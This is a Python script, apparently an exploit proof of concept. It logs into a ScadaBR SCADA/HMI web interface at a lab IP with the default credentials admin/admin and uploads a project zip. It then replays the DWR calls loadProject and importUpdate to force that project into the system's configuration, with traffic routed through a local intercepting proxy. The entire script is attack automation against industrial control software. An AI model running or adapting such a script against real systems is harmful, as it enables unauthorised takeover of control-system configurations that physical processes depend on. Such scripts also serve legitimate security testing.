import requests 

def to_plain_text(data):
    txt = ""
    for key,val in data.items():
        txt += key+"="+val+"\n"
    return txt

proxies = {"http": "http://localhost:8080"}


print("[i] Getting session and logging into ScadaBR...")
s = requests.Session()
r = s.post('http://192.168.48.132:8080/ScadaBR/login.htm', data={"username":"admin","password":"admin"}, proxies=proxies)


print(r)
print("[i] Session returned > ", r.text)

'''
Upload File
Content-Disposition: form-data; name="importFile"; filename="HMI-Export_26-07-21.zip"
Content-Type: application/zip
'''
print("[i] Attempting to upload to ScadaBR...")

files = {"importFile": ("random.zip", open("/root/Desktop/HMI-Export_26-07-21.zip","rb"), "application/zip")}
values = {"name": "importFile", "filename": "HMI-Export_26-07-21.zip"}

r = s.post("http://192.168.48.132:8080/ScadaBR/import_project.htm", files=files, proxies=proxies)

print(r)
print(r.text)

'''
    Initialize Long Poll or Whatever
'''
data_init_long_poll = {
    "callCount":"1",
    "page":"/ScadaBR/import_project.htm",
    "httpSessionId":"",
    "scriptSessionId":"0D069126AA0CBF0000A68E4279979BA6769",
    "c0-scriptName":"MiscDwr",
    "c0-methodName":"initializeLongPoll",
    "c0-id":"0",
    "c0-param0":"number:683118918",
    "c0-param1":"Object_Object:{}",
    "batchId":"0"
}

r = s.post('http://192.168.48.132:8080/ScadaBR/dwr/call/plaincall/MiscDwr.initializeLongPoll.dwr', data = to_plain_text(data_init_long_poll),proxies=proxies)

print(r)
print(r.text)


'''
POST /ScadaBR/dwr/call/plaincall/EmportDwr.loadProject.dwr
'''
data_loadProject = {
    "callCount":"1",
    "page":"/ScadaBR/import_project.htm",
    "httpSessionId":"",
    "scriptSessionId":"0D069126AA0CBF0000A68E4279979BA6769",
    "c0-scriptName":"EmportDwr",
    "c0-methodName":"loadProject",
    "c0-id":"0",
    "batchId":"1"
}

r = s.post('http://192.168.48.132:8080/ScadaBR/dwr/call/plaincall/EmportDwr.loadProject.dwr', data = to_plain_text(data_loadProject),proxies=proxies)

print(r)
print(r.text)


'''
POST /ScadaBR/dwr/call/plaincall/EmportDwr.importUpdate.dwr
'''
data_importUpdate = {
    "callCount":"1",
    "page":"/ScadaBR/import_project.htm",
    "httpSessionId":"",
    "scriptSessionId":"0D069126AA0CBF0000A68E4279979BA6769",
    "c0-scriptName":"EmportDwr",
    "c0-methodName":"importUpdate",
    "c0-id":"0",
    "batchId":"2"
}

r = s.post('http://192.168.48.132:8080/ScadaBR/dwr/call/plaincall/EmportDwr.importUpdate.dwr', data = to_plain_text(data_importUpdate),proxies=proxies)
print(r)
print(r.text)

